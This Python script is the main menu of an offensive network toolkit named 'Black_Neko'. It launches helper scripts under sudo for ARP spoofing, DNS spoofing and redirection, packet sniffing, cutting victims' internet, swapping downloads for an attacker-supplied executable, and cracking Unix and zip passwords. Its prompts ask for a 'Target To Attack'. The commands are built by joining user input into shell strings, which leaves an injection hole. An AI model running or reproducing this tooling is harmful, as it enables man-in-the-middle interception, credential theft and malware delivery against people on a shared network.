#!/usr/bin/env python3


import subprocess
import os




def menu():
	cmd2 = "python3 init.py"	
	subprocess.call(cmd2,shell=True)


def network_scanner(target):
	cmd = "sudo gnome-terminal -x python3 Scripts/network_scanner.py -t"+target
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)
	menu()

def network_cutter(target):
	cmd ="sudo gnome-terminal -x python3 Scripts/cutter.py -t"+target
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)
	menu()

def arp_spoof(target,spoof):
	cmd ="sudo gnome-terminal -x python3 Scripts/arp_spoof.py -t"+target+" -s"+spoof
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)
	menu()


def dns_spoof(website,bad_website):
	cmd ="sudo gnome-terminal -x python Scripts/dns_spoof.py -w"+website+" -i"+bad_website
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)


def packet_sniff():
	cmd ="sudo gnome-terminal -x python Scripts/packet_sniffer.py"
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)



def replace_downloads(exe):
	cmd ="sudo gnome-terminal -x python Scripts/replace_downloads.py -e"+exe
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)


def pwd_crack():
	cmd ="sudo gnome-terminal -x python Scripts/pwdc.py"
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)
	menu()


def zip_crack():
	cmd ="sudo gnome-terminal -x python Scripts/unzip.py"
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)
	menu()



def wordgen():
	cmd ="sudo gnome-terminal -x python3 Scripts/wordgen/cupp.py -i"
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)
	menu()



def arp_spoof_raw(target,spoof):
	cmd ="sudo gnome-terminal -x python3 Scripts/arp_spoof_raw.py -t"+target+" -s"+spoof
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)
	menu()


def rawsniff():
	cmd ="sudo gnome-terminal -x python3 Scripts/rawsniff.py"
	subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=None,shell=True)


print("""
      |\      _,,,---,,_
ZZZzz /,`.-'`'    -.  ;-;;,_
     |,4-  ) )-,_. ,\ (  `'-'
    '---''(_/--'  `-'\_)   Black_Neko || 814ck_n3k0
			""")


print("\n")
print("\n")
print(" __________________________Main Menu_________________________")
print("|                                                             |")
print("| Options:                                                    |")
print("| 1-  Scan Network                                            |")
print("| 2-  Cut Internet                                            |")
print("| 3-  Simple ARP spoofing                                     |")
print("| 4-  ARP & DNS spoofing                                      |")
print("| 5-  ARP with packet sniffing                                |")
print("| 6-  ARP & DNS spoofing with packet sniffing                 |")
print("| 7-  Download Replacing                                      |")
print("| 8-  Unix Password Cracking                                  |")
print("| 9-  Advanced WordList generator                             |")
print("| 10- Raw Socket Monitoring                                   |")
print("|_____________________________________________________________|")
print("\n")

option_list=["1","2","3","4","5","6","7","8","9","10"]


#in case of need to run using py2 change the list and if statements to ints
try:
	option_number = input("[+] Choose Option ==> ")
	if option_number not in option_list:
		print("[-] Option doesn't exist")




	elif option_number =="1":
		target = input("[+] Range to Scan On ==> ")
		print("\n")
		network_scanner(target)


	elif option_number =="2":
		target=input("[+] Range to Scan On ==> ")
		print("\n")
		network_cutter(target)


	elif option_number =="3":
		target= input("[+] Target To Attack ==> ")
		spoof = input("[+] Ip To Spoof ==> ")
		arp_spoof(target,spoof)


	elif option_number =="4":
		target= input("[+] Target To Attack ==> ")
		spoof = input("[+] Ip To Spoof ==> ")
		website = input("[+] Website To Spoof DNS ==>")
		bad_website = input("[+] Redirection Website ==>")
		dns_spoof(website,bad_website)
		arp_spoof(target,spoof)


	elif option_number == "5":
		target= input("[+] Target To Attack ==> ")
		spoof = input("[+] Ip To Spoof ==> ")
		packet_sniff()
		arp_spoof(target,spoof)


	elif option_number =="6":
		target= input("[+] Target To Attack ==> ")
		spoof = input("[+] Ip To Spoof ==> ")
		website = input("[+] Website To Spoof DNS ==>")
		bad_website = input("[+] Redirection Website ==>")
		packet_sniff()
		dns_spoof(website,bad_website)
		arp_spoof(target,spoof)


	elif option_number =="7":
		target= input("[+] Target To Attack ==> ")
		spoof = input("[+] Ip To Spoof ==> ")
		exe = input("[+] Link to Replacement exe ==> ")
		replace_downloads(exe)
		arp_spoof(target,spoof)


	elif option_number =="8":
		pwd_crack()




	elif option_number =="9":
		wordgen()


	elif option_number =="10":
		target= input("[+] Target Range To Attack ==> ")
		spoof = input("[+] Ip To Spoof ==> ")
		rawsniff()
		arp_spoof_raw(target,spoof)




except KeyboardInterrupt:
	print("\n  [+] Dtected Ctrl+C -------> Quitting.")
